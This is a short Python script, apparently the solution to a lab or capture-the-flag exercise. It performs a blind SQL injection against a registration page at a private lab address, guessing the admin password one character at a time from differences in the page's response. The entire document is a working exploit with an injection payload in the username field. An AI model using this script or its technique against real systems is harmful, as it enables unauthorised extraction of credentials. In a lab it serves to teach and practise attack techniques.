import sys, requests

def solve():
	URL = "http://10.11.10.11/sql-injection/registration/register.php"
	allowed_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 "
	password = ''
	
	while True:
		for ch in allowed_chars:
			urldata = "admin' and password like '%s%%'#" % (password+ch)
			r = requests.post(URL, data={"username":urldata})
			if "There is already a(n)" in r.text:
				password += ch
				print password
				break
			if ch == " ": # we didn't add anything new
				print "Finished!"
				print "Password is: %s" % password
				sys.exit(0)
	
solve()